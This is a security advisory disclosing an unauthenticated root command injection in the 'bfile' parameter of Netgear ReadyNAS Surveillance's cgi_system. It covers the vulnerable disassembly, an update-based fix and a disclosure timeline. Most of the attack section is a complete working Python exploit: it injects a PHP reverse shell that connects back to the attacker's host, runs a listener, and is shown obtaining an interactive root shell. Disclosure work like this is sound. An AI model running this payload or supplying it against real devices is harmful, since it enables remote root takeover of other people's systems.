Unauthenticated Remote Command Execution in Netgear ReadyNAS Surveillance
=========================================================================

Product Description
===================

Netgear ReadyNAS Surveillance is a NVR (Network Video Recorder) available for Netgear NAS systems.

Vulnerability Description
=========================

A critical vulnerability has been found in Netgear ReadyNAS Surveillance configuration backup feature, allowing remote users to execute arbitrary commands as root.


Unauthenticated Config File Download + Remote Root via RCE
==========================================================

Because the ReadyNAS Surveillance cgi_system cgi application doesn't check the
user-provided "bfile" POST parameter and does not check if the user is authenticated, it's
possible to execute arbitrary commands as root.
It's also possible, without RCE, to download the ReadyNAS Surveillance configuration files.

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-88

----------------
Proof of Concept
----------------

    #!/usr/bin/env python
    import requests
    import socket
    import telnetlib
    from thread import start_new_thread
    from time import sleep
    import argparse

    def exploit(target, reverse):
        print "[~] Sending payload..."
        requests.post("http://%s/cgi-bin/cgi_system?cmd=saveconfig" % target,
                            data={"bfolder":"/tmp",
                                  "bfile": ";$(php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");')" % reverse,
                                  "inc_emap": "no",
                                  "inc_pos": "no"})

    def handler(handler, lport):
        print "[~] Starting handler on port %d" % lport

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", lport))
        s.listen(1)
        conn, addr = s.accept()

        print "[+] Connection from %s" % addr[0]

        handler.sock = conn

    if __name__ == "__main__":
        print "[~] ReadyNAS Surveillance Remote Root Exploit (quick'n'dirty) - Nicolas Chatelain"

        parser = argparse.ArgumentParser()
        parser.add_argument("--target", required=True)
        parser.add_argument("--localhost", required=True)
        parser.add_argument("--localport", required=True, type=int)

        args = parser.parse_args()

        t = telnetlib.Telnet()
        start_new_thread(handler, (t, args.localport))
        sleep(1) # Just in case...
        start_new_thread(exploit, (args.target, (args.localhost, args.localport)))
        sleep(2) # Wait for it...

        if t.sock_avail():
            print "[+] Exploited."
            t.interact()
        else:
            print "[!!] Exploit failed."

Shell output :

    nightlydev@nworkstation ~/Lab/ReadyNAS_Exploit $ python readyroot.py --target 10.x.x.2 --localhost 10.x.x.10 --localport 9999

    [~] ReadyNAS Surveillance Remote Root Exploit (quick'n'dirty) - Nicolas Chatelain 
    [~] Starting handler on port 9999
    [~] Sending payload...
    [+] Connection from 10.x.x.2
    [+] Exploited.
    /bin/sh: 0: can't access tty; job control turned off
    # whoami
    root
    # id
    uid=98(admin) gid=98(admin) euid=0(root) groups=0(root),27(sudo),42(shadow),98(admin)

---------------
Vulnerable code
---------------

The vulnerable code is located in the /apps/surveillance/bin/cgi_system file.

                                                                                      bfile
    ------------------------------------------------------------------------------------vv---------------
    .text:00010CD8                 LDR     R2, =aCdSBinTarZcfSP ; "cd %s; /bin/tar -zcf %s passwd shadow"
    .text:00010CDC                 MOV     R0, R10         ; s
    .text:00010CE0                 STR     LR, [SP,#0x1658+var_1658]
    .text:00010CE4                 BL      snprintf
    .text:00010CE8                 MOV     R0, R10         ; s
    .text:00010CEC                 BL      strlen
    .text:00010CF0                 LDR     R1, =aDevNull2DevNul ; " > /dev/null 2>/dev/null"
    .text:00010CF4                 MOV     R2, #0x19       ; n
    .text:00010CF8                 ADD     R0, R10, R0     ; dest
    .text:00010CFC                 BL      memcpy
    .text:00010D00                 MOV     R0, R10         ; command
    .text:00010D04                 BL      system

--------
Solution
--------

Update to the latest version of Netgear ReadyNAS Surveillance.

Timeline (dd/mm/yyyy)
=====================

* 19/08/2015 : Initial discovery
* 20/08/2015 : First attempt to contact security[at]netgear.com -> No response
* September 2015 to December 2015 : Multiples attempts to contact security[at]netgear.com -> No response
* 20/01/2016 : Attempt to contact Netgear chat support
* 20/01/2016 : Response from Netgear, technical details and proof-of-concept sent.
* 20/01/2016 : Netgear confirms that exploit is working.
* 08/02/2016 : Netgear publishes security vulnerability announcement : http://kb.netgear.com/app/answers/detail/a_id/30275 and remove the ReadyNAS Surveillance package.
* 03/03/2016 : Netgear publishes a new version of ReadyNAS Surveillance that fixes the vulnerability.

Credits
=======

* Nicolas Chatelain, TNP Consultants (nicolas.chatelain -at- tnpconsultants -dot- com)

